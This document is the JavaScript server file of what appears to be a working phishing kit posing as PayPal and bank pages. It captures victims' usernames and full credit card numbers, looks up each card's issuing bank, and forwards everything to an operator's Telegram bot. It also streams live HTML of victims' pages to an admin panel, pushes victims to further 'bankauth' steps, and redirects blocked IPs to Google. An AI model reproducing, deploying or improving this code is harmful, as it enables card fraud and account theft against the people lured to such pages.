require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs'); // <-- Added for filesystem scanning
const session = require('express-session'); // <-- Added for authentication

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json()); // <-- Added for POST bodies
app.use(express.urlencoded({ extended: true }));

// Set view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Setup Session Middleware
class JsonStore extends session.Store {
    constructor() {
        super();
        this.path = path.join(__dirname, 'data.json');
        this.sessions = {};
        if (fs.existsSync(this.path)) {
            try { this.sessions = JSON.parse(fs.readFileSync(this.path, 'utf8')); } catch (e) { }
        }
    }
    get(sid, cb) { cb(null, this.sessions[sid] || null); }
    set(sid, sess, cb) {
        this.sessions[sid] = sess;
        fs.writeFile(this.path, JSON.stringify(this.sessions), (err) => { if (cb) cb(err); });
    }
    destroy(sid, cb) {
        delete this.sessions[sid];
        fs.writeFile(this.path, JSON.stringify(this.sessions), (err) => { if (cb) cb(err); });
    }
}

const sessionMiddleware = session({
    store: new JsonStore(),
    secret: process.env.SESSION_SECRET || 'super_secure_secret_key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 1000 * 60 * 60 * 24 } // 1 day cookie
});

app.use(sessionMiddleware);

// Share session middleware with Socket.IO
io.use((socket, next) => {
    sessionMiddleware(socket.request, socket.request.res || {}, next);
});

// Admin routes
const adminRoutes = require('./routes/admin');
app.use('/', adminRoutes);

// --- IP Blocking System ---
const blockedIpsPath = path.join(__dirname, 'blocked_ips.json');
let blockedIPsArray = [];
if (fs.existsSync(blockedIpsPath)) {
    try { blockedIPsArray = JSON.parse(fs.readFileSync(blockedIpsPath, 'utf8')); } catch (e) { }
}
const blockedIPsSet = new Set(blockedIPsArray);

// IP Blocking Middleware
app.use((req, res, next) => {
    // Determine the true IP of the visitor
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);
    
    // Localhost normalization (important for local testing)
    if (ip === '::1' || ip === '127.0.0.1') {
        ip = '127.0.0.1';
    }

    // If IP is blocked, redirect them (but allow them to reach /dash if they are an admin)
    if (blockedIPsSet.has(ip) && !req.path.startsWith('/dash')) {
        const redirectUrl = process.env.BLOCK_REDIRECT_URL || 'https://www.google.com';
        return res.redirect(redirectUrl);
    }
    next();
});
// -------------------------

// Page routes
const pageRoutes = require('./routes/pages');
app.use('/', pageRoutes);

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Configure Telegram Bot specifics here
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

// Maintain active visitors in server memory
const activeVisitors = new Map();

// Helper Function: Send Telegram Alerts
async function sendTelegramAlert(alertType, data, socket) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        return; // Silently skip if not configured
    }

    const session = socket.request.session;
    const visitorId = session && session.visitorId ? session.visitorId : 'Unknown ID';

    const host = socket.handshake.headers.host || 'localhost:3000';
    const proto = socket.handshake.headers['x-forwarded-proto'] || 'http';
    const dashboardUrl = `${proto}://${host}/dash?ip=${data.ip}`;

    let textMessage = '';

    if (alertType === 'new_visitor') {
        const ua = data.userAgent || '';
        let os = 'Unknown OS';
        let browser = 'Unknown Browser';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone')) os = 'iOS';

        if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';

        textMessage = `🟢 <b>New Visitor Arrived</b>
<b>Visitor ID:</b> <code>${visitorId}</code>
<b>IP Address:</b> <code>${data.ip}</code> 
<b>Location:</b> <code>${data.location || 'Unknown'}</code>
<b>ISP:</b> <code>${data.isp || 'Unknown'}</code>
<b>Device/OS:</b> <code>${os}</code>
<b>Browser:</b> <code>${browser}</code>
<b>URL:</b> <code>${data.url}</code>
<b>Target Console:</b> ${dashboardUrl}
<b>Time:</b> <code>${new Date().toISOString()}</code>`;

    } else if (alertType === 'form_submit') {
        const headerIcon = data.formType === 'support_request' ? '🆘' : '📝';
        const title = data.formType === 'support_request' ? 'New Support Request' : 'New Form Submission';

        // Format form details if available
        let detailsString = '';
        let bankInfo = '';

        if (data.details) {
            if (data.target === 'creditCardForm' && data.details.cardNumber) {
                try {
                    const bin = data.details.cardNumber.replace(/\s+/g, '').substring(0, 8);
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 3000);
                    const binResponse = await fetch(`https://lookup.binlist.net/${bin}`, {
                        headers: { 'Accept-Version': '3' },
                        signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    
                    if (binResponse.ok) {
                        const binData = await binResponse.json();
                        bankInfo = `\n💳 <b>Bank Info:</b> <code>${binData.bank?.name || 'UNKNOWN'} (${binData.country?.name || 'XX'} - ${binData.scheme || '?'} ${binData.type || '?'})</code>\n`;
                    }
                } catch (err) {
                    console.log('BIN lookup failed or timed out:', err.message);
                }
            }

            // Exclude username because it varies by form
            detailsString = Object.entries(data.details)
                .map(([key, value]) => `  ${key}: <code>${value}</code>`)
                .join('\n');
        }

        let os = 'Unknown OS';
        let browser = 'Unknown Browser';
        const ua = data.userAgent || '';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone')) os = 'iOS';
        if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';

        textMessage = `<b>${data.target}</b>
        
       ${detailsString}
============================
${bankInfo}
${data.details?.cardNumber ? `●●●●●●●●●●●●●●●●●\n<b>${data.details.cardNumber.split(' ').join('')}</b>\n●●●●●●●●●●●●●●●●●\n` : ''}



 
⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘
${dashboardUrl}
⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘⁘


 <b>Molah:</b> <code>${visitorId}</code>
`


;


    }

    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: textMessage,
            parse_mode: 'HTML'
        };

        // Telegram API drops 400 Bad Request if URL button contains 'localhost' or an IP without http auth
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log(`✅ Telegram alert (${alertType}) sent successfully!`);
        } else {
            console.error('❌ Failed to send Telegram alert:', await response.text());
        }
    } catch (error) {
        console.error('❌ Error sending Telegram alert:', error.message);
    }
}

// Socket.io connection handling
io.on('connection', (socket) => {
    console.log('A client connected:', socket.id);

    // Get visitor IP
    // Railway and other platforms use x-forwarded-for to pass the real IP
    let forwardedFor = socket.handshake.headers['x-forwarded-for'];
    let clientIp = forwardedFor ? forwardedFor.split(',')[0].trim() : socket.handshake.address;

    // Strip IPv6 to IPv4 mapping prefix if present
    if (clientIp.startsWith('::ffff:')) {
        clientIp = clientIp.substring(7);
    }

    if (clientIp === '::1' || clientIp === '127.0.0.1') {
        clientIp = '127.0.0.1'; // Localhost fallback
    }

    // Admin Panel Logic: Subscribe to the 'admins' room
    socket.on('admin_join', () => {
        // Enforce Secure Authentication
        const session = socket.request.session;
        if (!session || !session.isAdmin) {
            console.log(`⚠️ Unauthorized admin_join attempt from ${socket.id}`);
            socket.emit('auth_error', 'Unauthorized. Please log in.');
            return socket.disconnect(true);
        }

        console.log(`✅ Secure Admin joined Dashboard: ${socket.id}`);
        socket.join('admins');

        // Send currently active visitors to the newly joined admin
        socket.emit('initial_visitors', Array.from(activeVisitors.values()));
    });

    // Listen for telemetry data from the client
    socket.on('visitor_data', async (data) => {
        console.log(`[Telemetry] Data received from client ${socket.id}:`);

        // Fetch IP Geolocation data (using ip-api.com - free, no key needed for HTTP)
        let geoData = { country: 'Unknown', city: 'Unknown', ispValue: 'Unknown', countryCode: '' };
        try {
            // If local, use a dummy public IP for testing, or skip
            const lookupIp = clientIp === '127.0.0.1' ? '' : clientIp;
            const response = await fetch(`http://ip-api.com/json/${lookupIp}`);
            if (response.ok) {
                const geo = await response.json();
                if (geo.status === 'success') {
                    geoData = {
                        country: geo.country,
                        city: geo.city,
                        ispValue: geo.isp,
                        countryCode: geo.countryCode.toLowerCase()
                    };
                }
            }
        } catch (error) {
            console.error('Error fetching geolocation:', error.message);
        }

        // Include the socket ID and enriched IP data in the payload
        data.socketId = socket.id;
        data.ip = clientIp;
        data.location = `${geoData.city}, ${geoData.country}`;
        data.countryCode = geoData.countryCode;
        data.isp = geoData.ispValue;

        console.table(data);

        // Check if this IP is entirely new (not just swapping tabs/refreshing)
        let isNewIp = true;
        activeVisitors.forEach((existingVisitor, oldSocketId) => {
            if (existingVisitor.ip === clientIp) {
                isNewIp = false;
                activeVisitors.delete(oldSocketId);
                io.to('admins').emit('visitor_disconnected', { socketId: oldSocketId, ip: clientIp, isRotation: true });
                console.log(`[Session Rotation] Removed old socket ${oldSocketId} for IP ${clientIp}`);
            }
        });

        activeVisitors.set(socket.id, data);

        // Broadcast the telemetry to all connected admin dashboards
        io.to('admins').emit('new_visitor', data);

        // Send Initial Telegram Alert if it's a new Visitor IP
        if (isNewIp) {
            // sendTelegramAlert('new_visitor', data, socket); // Disabled per user request
        }
    });

    // Handle real-time user actions (DOM changes, inputs, forms)
    socket.on('visitor_action', async (data) => {
        data.socketId = socket.id;
        data.timestamp = new Date().toISOString();

        // Retrieve existing session data to populate IP and URL
        const visitorInfo = activeVisitors.get(socket.id) || {};
        data.ip = data.ip || visitorInfo.ip || 'Unknown';
        data.url = data.url || visitorInfo.url || 'Unknown';

        // --- 🚨 External Alert Logic 🚨 ---
        // Send a Telegram Webhook for Form Submits
        if (data.type === 'form_submit') {
            console.log('\n=============================================');
            console.log(`🔔 [EXTERNAL ALERT] Form submission detected from ${socket.id}!`);
            sendTelegramAlert('form_submit', data, socket);
            console.log('=============================================\n');

            // --- Capture Username for EJS templates ---
            if (data.details && data.details.username) {
                const session = socket.request.session;
                if (session) {
                    session.paypalUser = data.details.username;
                    session.save();
                }
            }

            // --- Capture Credit Card last 4 digits for bankauth ---
            if (data.target === 'creditCardForm' && data.details && data.details.cardNumber) {
                const session = socket.request.session;
                if (session) {
                    const cleanedCard = data.details.cardNumber.replace(/\s+/g, '');
                    session.keycc = cleanedCard.slice(-4);
                    session.save();
                }
            }

            // Send acknowledgment back to client to trigger their smart redirect
            if (data.redirectUrl) {
                socket.emit('form_success', { redirectUrl: data.redirectUrl });
            }
        }

        // Forward to the admin dashboard
        io.to('admins').emit('visitor_activity', data);
    });

    // Handle commands from the admin dashboard sent to specific IP addresses
    socket.on('admin_command', (data) => {
        console.log(`[Admin Command] Sending '${data.command}' to IP: ${data.targetIp}`);

        // Find all active sockets that match this IP and relay the command
        activeVisitors.forEach((visitor, sId) => {
            if (visitor.ip === data.targetIp) {
                io.to(sId).emit('visitor_command', data);
            }
        });
    });

    // Relay stop_live_view command slightly differently since it hits all visitors open right now
    socket.on('stop_live_view', () => {
        socket.broadcast.emit('stop_live_view');
    });

    // Handle large body innerHTML strings and send them to the admin panel
    socket.on('live_view_html', (data) => {
        // Strip out scripts from the incoming HTML to prevent execution in the admin iframe
        const sanitizedHtml = (data.html || '').replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');

        // Broadcast the specific visitor's HTML to admins
        io.to('admins').emit('live_view_html', {
            socketId: socket.id,
            ip: data.ip, // Optionally pass IP up
            html: sanitizedHtml
        });
    });

    socket.on('force_redirect', (data) => {
        console.log(`[Force Redirect] Redirecting IP ${data.targetIp} to ${data.url}`);

        activeVisitors.forEach((visitor, sId) => {
            if (visitor.ip === data.targetIp) {
                io.to(sId).emit('force_redirect', { url: data.url });
            }
        });
    });

    // Handle block_ip command from admin
    socket.on('block_ip', (data) => {
        if (data && data.targetIp) {
            console.log(`[Admin Command] Blocking IP permanently: ${data.targetIp}`);
            
            // 1. Add to set and save
            blockedIPsSet.add(data.targetIp);
            fs.writeFileSync(blockedIpsPath, JSON.stringify(Array.from(blockedIPsSet)));
            
            // 2. Force immediate redirect for any currently active sockets
            const redirectUrl = process.env.BLOCK_REDIRECT_URL || 'https://www.google.com';
            activeVisitors.forEach((visitor, sId) => {
                if (visitor.ip === data.targetIp) {
                    io.to(sId).emit('force_redirect', { url: redirectUrl });
                }
            });
        }
    });

    // Handle unblock_ip command from admin
    socket.on('unblock_ip', (data) => {
        if (data && data.targetIp) {
            console.log(`[Admin Command] Unblocking IP: ${data.targetIp}`);
            
            if (blockedIPsSet.has(data.targetIp)) {
                blockedIPsSet.delete(data.targetIp);
                fs.writeFileSync(blockedIpsPath, JSON.stringify(Array.from(blockedIPsSet)));
            }
        }
    });

    socket.on('disconnect', () => {
        console.log('A client disconnected:', socket.id);

        let ip = null;
        if (activeVisitors.has(socket.id)) {
            ip = activeVisitors.get(socket.id).ip;
            activeVisitors.delete(socket.id);
        }

        // Notify admins that the visitor left to remove them from the table
        io.to('admins').emit('visitor_disconnected', { socketId: socket.id, ip, isRotation: false });
    });
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
